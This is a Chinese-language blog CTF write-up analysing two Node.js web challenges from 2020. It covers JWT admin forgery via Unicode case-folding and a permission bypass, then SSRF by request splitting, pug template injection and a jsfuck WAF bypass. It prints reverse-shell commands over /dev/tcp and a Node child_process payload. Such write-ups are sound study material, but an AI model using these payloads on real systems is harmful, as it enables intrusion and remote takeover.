@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+   
+    <meta name="keywords" content="2020,HackTM,HackIM,CTF,nodejs,node,Draw with us,split second" />
+  
+  
+  
+  
+  <title>近两次比赛遇到的node题目简析 | 丶诺熙丨5am3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近水了水国际赛(摸鱼选手)，两次比赛都出现了node的题目。感觉挺有意思的，拿来分析一下。  HackTM CTF 2020 - Draw with us nullcon HackIM 2020 - split second 自己出的 - node game">
+<meta property="og:type" content="article">
+<meta property="og:title" content="近两次比赛遇到的node题目简析">
+<meta property="og:url" content="https://blog.5am3.com/2020/02/11/ctf-node1/index.html">
+<meta property="og:site_name" content="丶诺熙丨5am3">
+<meta property="og:description" content="最近水了水国际赛(摸鱼选手)，两次比赛都出现了node的题目。感觉挺有意思的，拿来分析一下。  HackTM CTF 2020 - Draw with us nullcon HackIM 2020 - split second 自己出的 - node game">
+<meta property="og:locale">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200205142502.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200205142630.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200205143224.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200205143347.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200205143502.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200205144320.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200205145220.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200209124732.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200209132217.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200209213857.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200209213933.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200210123701.png">
+<meta property="og:image" content="http://img.5am3.com/5am3/img/20200211224328.png">
+<meta property="article:published_time" content="2020-02-11T14:26:02.000Z">
+<meta property="article:modified_time" content="2024-12-05T02:39:41.684Z">
+<meta property="article:author" content="丶诺熙">
+<meta property="article:tag" content="nodejs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.5am3.com/5am3/img/20200205142502.png">
+  
+    <link rel="alternative" href="/atom.xml" title="丶诺熙丨5am3" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/avatar.jpg">
+  
+  
+  
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+        <script src="https://cdn.bootcdn.net/ajax/libs/require.js/2.1.6/require.min.js"></script>
+        <script src="https://cdn.bootcdn.net/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+        <!-- <script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script> -->
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder=" Search...">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/">主页</a></li>
+                        
+                            <li><a  href="/archives/">归档</a></li>
+                        
+                            <li><a  href="/tags">标签</a></li>
+                        
+                            <li><a  href="/categories/">分类</a></li>
+                        
+                            <li><a  href="/about/">关于</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/5am3" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="https://weibo.com/5am3" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                                <a class="fl mail"  target="_blank" href="mailto://i@5am3.com" title="mail">mail</a>
+                            
+                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/5am3" title="zhihu">zhihu</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/0ctf/" style="font-size: 10px;">0ctf</a> <a href="/tags/HEXO/" style="font-size: 12.5px;">HEXO</a> <a href="/tags/csp/" style="font-size: 10px;">csp</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/misc/" style="font-size: 12.5px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/nonce%E7%BB%95%E8%BF%87/" style="font-size: 10px;">nonce绕过</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 10px;">web渗透</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/writeup-web-xss/" style="font-size: 10px;">writeup - web - xss</a> <a href="/tags/xman/" style="font-size: 12.5px;">xman</a> <a href="/tags/xss/" style="font-size: 17.5px;">xss</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">被动扫描</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a>
+                    </div>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">一个热爱安全的小渣渣！</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/tags">标签</a></li>
+                
+                    <li><a href="/categories/">分类</a></li>
+                
+                    <li><a href="/about/">关于</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/5am3" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/5am3" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                        <a class="mail" target="_blank" href="mailto://i@5am3.com" title="mail">mail</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/5am3" title="zhihu">zhihu</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-ctf-node1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2020/02/11/ctf-node1/" class="article-date">
+      <time datetime="2020-02-11T14:26:02.000Z" itemprop="datePublished">2020-02-11</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      近两次比赛遇到的node题目简析
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/writeup/">writeup</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>最近水了水国际赛(摸鱼选手)，两次比赛都出现了node的题目。感觉挺有意思的，拿来分析一下。</p>
+<ol>
+<li>HackTM CTF 2020 - Draw with us</li>
+<li>nullcon HackIM 2020 - split second</li>
+<li>自己出的 - node game</li>
+</ol>
+<span id="more"></span>
+
+
+<h2 id="HackTM-CTF-2020-Draw-with-us"><a href="#HackTM-CTF-2020-Draw-with-us" class="headerlink" title="HackTM CTF 2020 - Draw with us"></a>HackTM CTF 2020 - Draw with us</h2><blockquote>
+<p>Come draw with us!</p>
+<p><a href="http://167.172.165.153:60000/">http://167.172.165.153:60000/</a></p>
+<p>Author: stackola</p>
+<p><strong>Hint!</strong> Changing your color is the first step towards happiness.</p>
+<p>附件：<a href="https://pan.baidu.com/s/17Qa7bDkE9eceHsdj0g6BZg">https://pan.baidu.com/s/17Qa7bDkE9eceHsdj0g6BZg</a></p>
+</blockquote>
+<p>一道nodejs源码审计的题目。只要细心审计就OK的。</p>
+<p>首先先分析路由。发现存在&#x2F;flag，直接跟进，看一下有什么验证。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="comment">// Only for root</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">user</span>.<span class="property">id</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title function_">ok</span>(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title function_">err</span>(<span class="string">&quot;Unauthorized&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在这里，要求user.id&#x3D;&#x3D;0，也就是说需要我们去伪造管理员身份。</p>
+<p>继续分析，可以发现这题采用了jwt，jwt常见的攻击手法有两类</p>
+<ul>
+<li>拿到secretkey，进而伪造jwt。（爆破，信息泄露）</li>
+<li>修改jwt加密头为none。</li>
+</ul>
+<p>详见<a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p>
+<p>在这里，经过尝试都不太行。但是继续分析路由接口。</p>
+<p>可以发现init是个后门，serverInfo是个信息泄露，而updateUser是信息泄露利用的关键点。</p>
+<p>整体逻辑为：通过updateUser，添加泄露点n，进而通过serverInfo获取信息。然后采用n来利用init这个后门。</p>
+<p>接下来继续按刚才的逻辑分析。先来说一下serverInfo。</p>
+<p>serverInfo将当前用户有权限的信息打印出来，其信息是从config里取出。</p>
+<p><img src="http://img.5am3.com/5am3/img/20200205142502.png"></p>
+<p>默认用户没有以上三个信息权限。由此可见p,n为敏感信息。进而去追他的利用链。</p>
+<p>可以看到其在init中被调用，其md5值为target。然后和我们传入构造的pwHash作比较。之后执行了清空画板操作。所以猜测只要我们pwHash构造出来与target相等，即可伪造管理员。</p>
+<p>继续往下看，可以看到113行这里，通过pwHash进而得到adminId，然后再121行返回admin的token。这正是我们想要的。</p>
+<p>分析114，可以发现是将pwHash逐位于target做异或，然后累加，最终得到的即为adminId。</p>
+<p>即我们要构造pwHash&#x3D;&#x3D;target即可让adminId&#x3D;0</p>
+<p><img src="http://img.5am3.com/5am3/img/20200205142630.png"></p>
+<p>此时逻辑已经清楚，那么我们如何得到n？</p>
+<p>继续回到updateUser，想办法将n加入到我们的权限中。</p>
+<p><img src="http://img.5am3.com/5am3/img/20200205143224.png"></p>
+<p><img src="http://img.5am3.com/5am3/img/20200205143347.png"></p>
+<p>分析updateUser，可以发现，其判断是否为admin，通过uid得到user对象，进而对username转化为小写作比较。</p>
+<p>那我们是不是可以通过注册大写字母用户绕过？不存在的。在注册的时候，就已经对用户名做限制了。</p>
+<p><img src="http://img.5am3.com/5am3/img/20200205143502.png"></p>
+<p>此时有一个很奇怪的点。他们一个验证用的大写，一个验证小写。中间会不会出问题呢？也就是我们构造一个字符，符合下面条件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username.<span class="title function_">toUpperCase</span>() !== <span class="string">&quot;hacktm&quot;</span>.<span class="title function_">toUpperCase</span>()</span><br><span class="line">username.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;hacktm&quot;</span>.<span class="title function_">toLowerCase</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其实是可以的，在字符转换中，有些奇奇怪怪的字符，也是会被转换的。</p>
+<p>比如：在toUpperCase()函数中，字符<code>ı</code>会转变为<code>I</code>，字符<code>ſ</code>会变为<code>S</code>。在toLowerCase()函数中，字符<code>İ</code>会转变为<code>i</code>，字符<code>K</code>会转变为<code>k</code>。</p>
+<p>此时我们便可构造<code>hacKtm</code>来绕过。</p>
+<p>紧接着往下，我们可以发现185行，对权限做了黑名单校验。禁止我们加入n的权限。在这里，可以直接通过数组绕过。将p放到数组里。</p>
+<p><img src="http://img.5am3.com/5am3/img/20200205144320.png"></p>
+<p>至此，这道题基本已经OK了，接下来就是利用。</p>
+<ol>
+<li>注册<code>hacKtm</code>用户</li>
+<li>调用updateUser接口。</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xDEDBEE&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;rights&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">[</span><span class="string">&quot;n&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>调用serverInfo接口，获取n</li>
+<li>调用init接口，传入p&#x3D;n，q&#x3D;1</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/init</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>167.172.165.153:60000</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjJiNTI3MjBkLTEyOGEtNDllYy1iMTc5LWU0NDUwZTdlODcxMSIsImlhdCI6MTU4MDg4NTQ1MH0.QKvGRVTj7IIpZvdtqPSpBNFFjl7woPBu7tSTI3gQLNo</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>314</span><br><span class="line"></span><br><span class="line"><span class="language-css">&#123;&quot;<span class="selector-tag">p</span>&quot;:<span class="string">&quot;54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979&quot;</span>, <span class="string">&quot;q&quot;</span>:<span class="number">1</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>拿到返回token，置入cookie中，请求&#x2F;flag接口</li>
+</ol>
+<p><img src="http://img.5am3.com/5am3/img/20200205145220.png"></p>
+<h2 id="nullcon-HackIM-2020-split-second"><a href="#nullcon-HackIM-2020-split-second" class="headerlink" title="nullcon HackIM 2020 - split second"></a>nullcon HackIM 2020 - split second</h2><blockquote>
+<p>Split that Shit<br><a href="http://web2.ctf.nullcon.net:8081/">http://web2.ctf.nullcon.net:8081/</a></p>
+<p>源码：<a href="https://github.com/nullcon/hackim-2020/tree/master/web/split_second">https://github.com/nullcon/hackim-2020/tree/master/web/split_second</a></p>
+</blockquote>
+<p>打开题目，可以审查元素发现第一个hint。<br><img src="http://img.5am3.com/5am3/img/20200209124732.png"><br>然后<code>http://web2.ctf.nullcon.net:8081/source</code>拿到源码，开始代码审计之旅。</p>
+<p>分析题目，可以发现主页基本没什么东西，而是通过请求<code>/core</code>这个接口，来获取内容，并添加至主页。</p>
+<p>还是从源码入手。可以发现<code>/core</code>接口是直接请求<code>/getMeme</code>接口，获取到数据。此时传入了q参数。</p>
+<p>然后可以发现存在<code>/flag</code>接口，分析后，可以发现是个后门。并且需要本地访问。</p>
+<p>根据以上信息，我们可以推断出，利用<code>/core</code>接口，造成ssrf，进而访问<code>/flag</code>后门，获取flag。</p>
+<p>那问题来了，我们如何去得到一个ssrf？<code>/core</code>中，我们可以操控的点只有参数q。</p>
+<p>经过查询资料，最终发现其实题目名称就是一个hint。有一种攻击方式是：拆分请求来实现的SSRF攻击。<br>可以参考：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/2894">通过拆分攻击实现的SSRF攻击</a></li>
+<li><a href="https://hpdoger.cn/2019/12/01/I-SOON2019-Membershop%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">I-SOON2019-Membershop出题思路</a></li>
+</ul>
+<p>在这里就不细说了。</p>
+<p>其实可以与CRLF注入类比一下。在这里，也是通过构造换行，来结束前一个请求，并构造出下一个请求。下面就是我们q的参数。我们只要成功注入，便会多一个发往flag的请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x HTTP/1.1\r\n\r\nGET /flag HTTP/1.1\r\nadminauth: secretpassword\r\npug: #&#123;xxx&#125;\r\n</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/core?q=x</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-http"></span></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/flag</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"><span class="attribute">adminauth</span><span class="punctuation">: </span>secretpassword</span></span><br><span class="line"><span class="language-http"><span class="attribute">pug</span><span class="punctuation">: </span>#&#123;xxx&#125;</span></span><br><span class="line"><span class="language-http"></span></span><br></pre></td></tr></table></figure>
+
+<p>在nodejs中，其实对换行操作做了处理，但是在node8及以下，在处理unicode字符存在问题。可以导致换行符出现。具体可以看<a href="https://xz.aliyun.com/t/2894">上面文章</a></p>
+<p>我们可以构造如下样子，来造出换行符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test</span><br></pre></td></tr></table></figure>
+<p>可以通过以下js脚本，来进行编码。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">shellCodeRaw=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line"><span class="keyword">var</span> shellCodeRawList = shellCodeRaw.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> shellCodeAsciiList= [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;shellCodeRawList.<span class="property">length</span>;i++)&#123;</span><br><span class="line">	tmp = shellCodeRawList[i].<span class="title function_">charCodeAt</span>()</span><br><span class="line">	shellCodeAsciiList.<span class="title function_">push</span>(tmp.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode=shellCodeAsciiList.<span class="title function_">join</span>(<span class="string">&quot;&#125;\\u&#123;01&quot;</span>);</span><br><span class="line">shellcode= <span class="string">&quot;\\u&#123;01&quot;</span>+shellcode+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;encodeURI(&#x27;&quot;</span>+shellcode+<span class="string">&quot;&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// \r\n --&gt; %C4%8D%C4%8A</span></span><br><span class="line"><span class="comment">// 空格 --&gt; %C4%A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造如下参数</span></span><br><span class="line"><span class="comment">//z%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0/flag%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A</span></span><br></pre></td></tr></table></figure>
+
+<p>然后可以本地尝试以下。是否发出了两次请求。<br>由于原题目没有日志，我们修改源码，可以开启一下日志。添加如下两行即可。（记得<code>npm install morgan</code>)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">morgan</span>(<span class="string">&#x27;short&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://img.5am3.com/5am3/img/20200209132217.png"></p>
+<p>至此，ssrf已经get。接下来分析<code>/flag</code>接口。<br>可以看到，其传入了两个参数，都是以headers的形式。<br>adminauth是一个密码，pug则是我们要渲染的模板内容。<br>了解过ssti的同学一定不陌生模板这个东西。<br>在nodejs中，pug是一个模板引擎。其表达式形式为<code>#&#123;&#125;</code><br>(#因为其在url中特殊用途，所以需要按如上方式再次编码。)</p>
+<p>我们只需构造我们的代码，来获取flag即可。</p>
+<p>在这里我又陷入了一个深坑。<br>nodejs 的exec默认采用sh执行，而sh在不同系统指向也不同，主要分为bash和dash，如果在dash中执行以下命令反弹shell，是会出问题的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.1.98/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>具体可参考：<a href="https://www.dazhuanlan.com/2019/11/15/5dce507a41df5/">解决ubuntu反弹shell失败的问题</a></p>
+<p>解决方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/evalip/2202 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后构造nodejs的反弹shell即可。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/evalip/2202 0&gt;&amp;1&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>在pug模板中，不能直接用require，所以我们采用如上方式。</p>
+<p>此时审查代码，可以发现这里有2个waf。<br><img src="http://img.5am3.com/5am3/img/20200209213857.png"></p>
+<p><img src="http://img.5am3.com/5am3/img/20200209213933.png"></p>
+<p>分别是，禁止列表内元素，以及禁止小写字母出现。</p>
+<p>刚入门CTF时，大家可能都接触过，jsfuck，aaencode，jjencode，在这里，我分析以上三种编解码后，采取了jsfuck。</p>
+<p>虽然jsfuck中存在<code>!</code>，但是我们根绝相关文档，可以将其替换为数字。<br><a href="https://www.bugku.com/tools/jsfuck/">jsfuck在线编码</a></p>
+<p>其实有!号含义，主要有以下几种。我们可以一一替换一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">false     =&gt;  ![]   =&gt; (1==0)</span><br><span class="line">true      =&gt;  !![]   =&gt; (1==1)</span><br><span class="line">1         =&gt;  !+[]   =&gt; (1)</span><br></pre></td></tr></table></figure>
+<p>然后将我们的反弹shell的payload编码，然后将叹号做如上替换即可。<br>(先替换true，后替换false)</p>
+<p>然后即可。最终payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// [jscode] 为构造好的js语句</span><br><span class="line"></span><br><span class="line">x%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0/flag%C4%A0HTTP/1.1%C4%8D%C4%8Aadminauth:%C4%A0secretpassword%C4%8D%C4%8Apug:%C4%A0%C4%A3&#123;[jscode]&#125;%C4%8D%C4%8A%C4%8D%C4%8A</span><br></pre></td></tr></table></figure>
+
